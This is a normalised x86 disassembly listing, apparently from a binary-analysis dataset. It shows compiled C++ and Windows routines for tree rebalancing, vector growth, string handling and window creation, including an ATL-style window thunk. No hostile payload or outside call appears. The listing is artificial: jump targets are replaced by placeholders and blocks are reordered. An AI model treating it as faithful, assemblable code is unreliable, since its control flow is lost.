pop ecx
pop esi
pop ebp
pop ebx
add esp 0x54
retn 0x10
lea esp [ esp ]
mov edx [ edx ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x14 ] bl
je r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x14 ] 0x1
mov [ edx + 0x14 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] bl
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ecx ]
cmp [ edx + 0x15 ] bl
jne r-xdata
push ebp
mov esi ecx
call sub_4261c0
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp [ ecx + 0x14 ] bl
je r-xdata
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] bl
mov edx [ eax ]
mov eax [ edx + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov [ esi + 0x8 ] eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov esi [ esp + 0x68 ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x18 ]
cmp esi [ edx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] esi
mov edx [ eax + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ eax ]
cmp esi [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] eax
mov [ edx ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] esi
mov [ eax ] ecx
sub_411ce0
sub esp 0x8
push ebx
push ebp
mov ebx eax
mov edx [ ebx + 0xc ]
push esi
push edi
test edx edx
jne r-xdata
mov eax [ ebx + 0x14 ]
sub eax edx
sar eax 0x2
mov ecx eax
xor ecx ecx
jmp r-xdata
inc eax
cmp ecx eax
jae r-xdata
call sub_411eb0
mov esi [ ebx + 0x10 ]
mov eax esi
sub eax edx
sar eax 0x2
mov edx 0x3fffffff
sub edx eax
cmp edx 0x1
jae r-xdata
mov edi [ esp + 0x24 ]
mov ecx esi
sub ecx edi
sar ecx 0x2
mov eax esi
cmp ecx 0x1
jae r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3fffffff
sub esi edx
cmp esi ecx
jae r-xdata
mov ecx [ esp + 0x1c ]
mov ebp [ ecx ]
lea edi [ esi - 0x4 ]
mov edx esi
call sub_4126e0
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x24 ]
sub edi eax
sar edi 0x2
test edi edi
jle r-xdata
mov edx [ esp + 0x1c ]
mov ebp [ edx ]
lea edx [ edi + 0x4 ]
mov [ esp + 0x1c ] ebp
call sub_4126e0
mov edi [ ebx + 0x10 ]
mov eax edi
sub eax [ esp + 0x24 ]
mov esi 0x1
sar eax 0x2
sub esi eax
lea edx [ esp + 0x1c ]
call sub_4102f0
add [ ebx + 0x10 ] 0x4
mov ebx [ ebx + 0x10 ]
mov eax [ esp + 0x24 ]
lea ecx [ ebx - 0x4 ]
cmp eax ecx
je r-xdata
add ecx edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
jmp r-xdata
lea ecx [ eax + 0x4 ]
cmp eax ecx
je r-xdata
lea ecx [ edi * 4 ]
push ecx
push eax
push ecx
sub esi ecx
push esi
call sub_43fbf5
mov eax [ esp + 0x34 ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
mov [ eax ] ebp
add eax 0x4
cmp eax ecx
jne r-xdata
call sub_410680
mov ebp [ esp + 0x24 ]
sub ebp [ ebx + 0xc ]
mov edx [ esp + 0x1c ]
sar ebp 0x2
lea edi [ eax + ebp * 4 ]
mov esi 0x1
mov [ esp + 0x14 ] eax
call sub_4102f0
mov edx [ esp + 0x24 ]
mov ecx [ ebx + 0xc ]
mov edi [ esp + 0x14 ]
mov eax edx
sub eax ecx
sar eax 0x2
test eax eax
jbe r-xdata
mov [ esp + 0x10 ] eax
mov ecx eax
cmp ecx eax
jae r-xdata
mov [ eax ] ebp
add eax 0x4
cmp eax ecx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
mov eax [ ebx + 0x10 ]
sub eax edx
sar eax 0x2
test eax eax
jbe r-xdata
add eax eax
add eax eax
push eax
push ecx
push eax
push edi
call sub_43fbf5
mov edx [ esp + 0x34 ]
add esp 0x10
mov eax [ ebx + 0xc ]
mov esi [ ebx + 0x10 ]
sub esi eax
sar esi 0x2
inc esi
test eax eax
je r-xdata
add eax eax
add eax eax
push eax
push edx
push eax
lea eax [ edi + ebp * 4 + 0x4 ]
push eax
call sub_43fbf5
add esp 0x10
mov ecx [ esp + 0x10 ]
lea edx [ edi + ecx * 4 ]
lea eax [ edi + esi * 4 ]
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x10 ] eax
mov [ ebx + 0xc ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
push eax
call sub_43f960
add esp 0x4
sub_411eb0
push 0xffffffff
push sub_459c48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
push 0x12
push r--data
lea ecx [ esp + 0xc ]
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
call sub_42a180
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x54 ] 0x0
call sub_4296c0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] r--data
call sub_442eab
int3
sub_411f30
push 0xffffffff
push sub_459a44
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_429ea0
lea ecx [ esi + 0x1c ]
mov [ esp + 0x18 ] ebx
push 0xffffffff
mov ebp 0x7
xor edx edx
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] ebx
lea eax [ edi + 0x1c ]
push ebx
mov [ ecx + 0x4 ] dx
call sub_429a10
lea ecx [ esi + 0x38 ]
mov [ esp + 0x18 ] 0x1
push 0xffffffff
xor edx edx
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] ebx
lea eax [ edi + 0x38 ]
push ebx
mov [ ecx + 0x4 ] dx
call sub_429a10
lea ecx [ esi + 0x54 ]
mov [ esp + 0x18 ] 0x2
push 0xffffffff
xor edx edx
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] ebx
lea eax [ edi + 0x54 ]
push ebx
mov [ ecx + 0x4 ] dx
call sub_429a10
mov [ esp + 0x18 ] 0x3
mov al [ edi + 0x70 ]
mov [ esi + 0x70 ] al
mov cl [ edi + 0x71 ]
mov [ esi + 0x71 ] cl
mov dl [ edi + 0x72 ]
mov [ esi + 0x72 ] dl
lea ecx [ esi + 0x74 ]
push 0xffffffff
xor edx edx
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] ebx
lea eax [ edi + 0x74 ]
push ebx
mov [ ecx + 0x4 ] dx
call sub_429a10
mov [ esp + 0x18 ] 0x4
mov eax [ edi + 0x90 ]
mov [ esi + 0x90 ] eax
mov ecx [ edi + 0x98 ]
mov [ esi + 0x98 ] ecx
mov edx [ edi + 0x9c ]
mov [ esi + 0x9c ] edx
mov eax [ edi + 0xa0 ]
mov [ esi + 0xa0 ] eax
lea ecx [ esi + 0xa4 ]
push 0xffffffff
xor edx edx
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] ebx
lea eax [ edi + 0xa4 ]
push ebx
mov [ ecx + 0x4 ] dx
call sub_429a10
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
sub_412070
push 0xffffffff
push sub_45a278
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ esp + 0x1c ]
push esi
call sub_411f30
lea eax [ esi + 0xc0 ]
lea ecx [ edi + 0xc0 ]
push eax
mov [ esp + 0x18 ] 0x0
call sub_40fb60
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn 0x4
sub_4120d0
push 0xffffffff
push sub_459c48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
push 0x11
push r--data
lea ecx [ esp + 0xc ]
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
call sub_42a180
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x54 ] 0x0
call sub_4296c0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] r--data
call sub_442eab
int3
sub_412150
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_42a180
mov eax esi
pop edi
retn
mov eax edx
push edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
sub_412190
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4121e0
mov ecx 0x1
call sub_424f60
xor ecx ecx
cmp eax ecx
je r-xdata
retn 0xc
mov edx [ esp + 0x4 ]
mov [ eax ] edx
mov edx [ esp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x8 ] edx
mov edx [ esi ]
mov [ eax + 0xc ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x15 ] cl
sub_412220
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
mov edi eax
and eax 0x3
mov ebx eax
mov eax [ esi ]
shr edi 0x2
test eax eax
jne r-xdata
mov ecx [ eax ]
jmp r-xdata
call sub_4407b7
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor ecx ecx
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov esi [ esi ]
test esi esi
je r-xdata
call sub_4407b7
mov eax [ eax + 0x1c ]
add eax [ ecx + 0x18 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ eax + 0x14 ] edi
ja r-xdata
xor esi esi
mov ecx [ esi + 0x10 ]
mov edx [ ecx + edi * 4 ]
pop edi
pop esi
lea eax [ edx + ebx * 4 ]
pop ebx
retn
mov esi [ esi ]
mov ecx [ esi + 0x10 ]
mov edx [ ecx + edi * 4 ]
pop edi
pop esi
lea eax [ edx + ebx * 4 ]
pop ebx
retn
xor eax eax
mov eax [ esi ]
jmp r-xdata
sub edi [ eax + 0x14 ]
sub_4122d0
push ebx
mov eax ecx
push esi
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
mov esi [ edi + 0x14 ]
mov ebx eax
mov eax esi
cmp esi ebx
jb r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov eax ebx
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
xor ecx ecx
test eax eax
sete cl
pop esi
mov al cl
pop ebx
retn
cmp esi ebx
jae r-xdata
call sub_413160
test eax eax
jne r-xdata
xor eax eax
cmp esi ebx
setne al
or eax 0xffffffff
xor ecx ecx
test eax eax
sete cl
pop esi
mov al cl
pop ebx
retn
sub_412330
mov eax esi
push edi
lea edi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
mov edi eax
mov eax [ ecx + 0x14 ]
push esi
call sub_4298e0
neg eax
sbb eax eax
inc eax
pop edi
retn
sub_412360
push esi
call sub_416140
mov esi eax
test esi esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push ebx
mov ebx [ esp + 0xc ]
push edi
push esi
mov ecx esi
mov [ esi + 0x4 ] ebx
call edx
lea edi [ esi + 0x8 ]
call sub_416300
mov esi [ esi + 0x14 ]
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongW@IAT ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
push ecx
push edx
push ebx
call esi
pop edi
pop ebx
pop esi
retn 0x10
pop esi
retn 0x10
sub_4123b0
push ecx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x14 ]
mov ecx 0xfffffff3
push 0xd
sub ecx eax
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
test bx bx
je r-xdata
call j_sub_43f543
mov [ edi + 0x14 ] eax
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
pop ecx
retn 0x14
lea esi [ edi + 0x8 ]
mov eax edi
call sub_4133f0
mov esi [ esp + 0x24 ]
test esi esi
jne r-xdata
push 0xe
call [ SetLastError@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
test ebp 0x40000000
je r-xdata
mov ecx [ eax + 0x4 ]
mov edi [ rw-data ]
mov edx [ eax ]
push 0x0
push edi
push esi
mov esi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push 0x0
sub esi ecx
push esi
sub eax edx
push eax
mov eax [ esp + 0x38 ]
push ecx
mov ecx [ esp + 0x34 ]
push edx
push ebp
movzx edx bx
push ecx
push edx
push eax
call [ CreateWindowExW@IAT ]
pop edi
pop esi
pop ebp
pop ecx
retn 0x14
mov eax rw-data
mov [ esp + 0x14 ] eax
mov esi edi
mov [ esp + 0x24 ] esi
sub_4124a0
push ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
mov eax [ esp + 0x20 ]
call sub_412830
add esp 0x14
retn
sub_412500
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_429ea0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_412520
push ecx
push esi
mov esi eax
mov [ esp + 0x4 ] 0x0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
push edi
push ebx
mov ecx esi
call sub_412db0
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax * 8 ]
sub ecx eax
add ecx ecx
add esp 0x14
add ecx ecx
mov eax edi
sub eax ecx
pop esi
pop ecx
retn
sub_412570
push ecx
mov ecx [ esp + 0xc ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
call sub_412c20
add esp 0x14
retn 0x8
sub_4125a0
push esi
mov esi ecx
push edi
mov edi eax
cmp esi ebx
je r-xdata
pop edi
pop esi
retn
lea ebx [ ebx ]
call sub_402610
add esi 0xc0
cmp esi ebx
jne r-xdata
sub_4125d0
push ecx
mov ecx [ esp + 0xc ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
call sub_412fa0
add esp 0x14
retn 0x8
sub_412600
sub esp 0x8
push esi
mov esi eax
xor al al
mov [ esp + 0x8 ] al
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
mov [ esp + 0x4 ] al
mov eax [ esp + 0x4 ]
push eax
push ecx
push edx
push ebx
mov eax edi
mov ecx esi
call sub_412f10
sub esi ebx
mov eax 0x4bda12f7
imul esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov ecx eax
imul ecx ecx 0xd8
add esp 0x10
mov eax edi
sub eax ecx
pop esi
add esp 0x8
retn
sub_412680
sub esp 0x8
push esi
mov esi eax
xor al al
mov [ esp + 0x8 ] al
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
mov [ esp + 0x4 ] al
mov eax [ esp + 0x4 ]
push eax
push ecx
push edx
push ebx
mov eax edi
mov ecx esi
call sub_412f50
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax * 8 ]
sub ecx eax
add ecx ecx
add esp 0x10
add ecx ecx
mov eax edi
sub eax ecx
pop esi
add esp 0x8
retn
sub_4126e0
sub eax edi
sar eax 0x2
lea ecx [ eax * 4 ]
push esi
lea esi [ ecx + edx ]
test eax eax
jbe r-xdata
mov eax esi
pop esi
retn
push ecx
push edi
push ecx
push edx
call sub_43fbf5
add esp 0x10
sub_412710
push ebp
mov ebp [ esp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push ebp
push ebx
call sub_441acd
mov esi eax
mov eax [ edi ]
mov edx [ eax - 0x8 ]
sub eax 0x10
mov ecx 0x1
sub ecx [ eax + 0xc ]
sub edx esi
add esp 0x8
or ecx edx
jge r-xdata
push 0x80070057
call sub_427e00
mov ecx [ edi ]
push ebp
push ebx
lea eax [ esi + 0x1 ]
push eax
push ecx
call sub_441a59
add esp 0x10
test esi esi
jl r-xdata
mov ecx esi
mov eax edi
call sub_41fb90
push 0x80070057
call sub_427e00
mov eax [ edi ]
cmp esi [ eax - 0x8 ]
jg r-xdata
mov [ eax - 0xc ] esi
mov edx [ edi ]
xor eax eax
mov [ edx + esi * 2 ] ax
pop esi
pop ebp
retn 0x4
sub_412790
push ebp
mov ebp esp
push 0xffffffff
push sub_459735
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
dec edi
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_429ea0
cmp edi ebx
jbe r-xdata
sub_4127fb
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_442eab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_412bc0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_412830
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi eax
push edi
mov edi ecx
mov ecx ebp
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
lea ebx [ eax + eax * 2 ]
shl ebx 0x6
add ebx esi
cmp edi ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn
mov eax esi
sub eax edi
mov [ esp + 0x14 ] eax
jmp r-xdata
lea esi [ eax + edi ]
call sub_402610
add edi 0xc0
cmp edi ebp
jne r-xdata
mov eax [ esp + 0x14 ]
sub_412890
push ebp
mov ebp esp
push 0xffffffff
push sub_459c25
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov ebx edx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
dec ebx
add esi 0xc0
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] esi
jmp r-xdata
push esi
call sub_411f30
test ebx ebx
jbe r-xdata
sub_4128f2
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_442eab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
call sub_402480
add esi 0xc0
cmp esi edi
jne r-xdata
sub_412930
push ebp
mov ebp esp
push 0xffffffff
push sub_45a6dd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov ebx edx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
dec ebx
add esi 0xd8
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] esi
jmp r-xdata
push esi
call sub_411f30
lea eax [ esi + 0xc0 ]
lea ecx [ edi + 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40fb60
test ebx ebx
jbe r-xdata
sub_4129ab
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_442eab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_412bf0
add esi 0xd8
cmp esi edi
jne r-xdata
sub_4129f0
push ebp
mov ebp esp
push 0xffffffff
push sub_459fd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov ecx esi
call sub_412e90
add esp 0x4
dec edi
add esi 0x1c
mov [ ebp + 0x8 ] esi
jmp r-xdata
test edi edi
jbe r-xdata
sub_412a48
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_442eab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_412bc0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_412a80
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp [ esp + 0xc ]
je r-xdata
pop ebp
retn
push ebx
push esi
push edi
lea edi [ ebp + 0xcc ]
mov ecx [ edi - 0xc ]
xor eax eax
push ecx
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_43f960
add esp 0x4
mov esi ebp
call sub_402480
add ebp 0xd8
add edi 0xd8
cmp ebp [ esp + 0x18 ]
jne r-xdata
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov eax [ edi ]
push eax
call sub_43f960
add esp 0x4
call sub_402480
add esi 0xc0
cmp esi ebx
jne r-xdata
sub_412af0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi eax
cmp esi ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
lea ebx [ edi + 0xc0 ]
call sub_402610
lea eax [ esi + 0xc0 ]
push eax
call sub_40fc70
add esi 0xd8
cmp esi ebp
jne r-xdata
sub_412b30
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
push ebx
xor ebx ebx
lea ebx [ ebx ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_43f960
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
pop ebx
sub_412b70
push esi
mov esi eax
cmp esi ebx
je r-xdata
pop esi
retn
push ebp
mov ebp [ esp + 0xc ]
push edi
add ebp 0x4
mov edx ebp
mov edx [ ebp ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_42a180
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax edx
lea edi [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
pop edi
pop ebp
sub_412bf0
push ebx
push esi
mov esi eax
lea ebx [ esi + 0xc0 ]
call sub_40ffb0
mov eax [ ebx ]
push eax
call sub_43f960
add esp 0x4
call sub_402480
pop esi
pop ebx
retn
sub_412c20
push ebp
mov ebp esp
push 0xffffffff
push sub_459fb5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
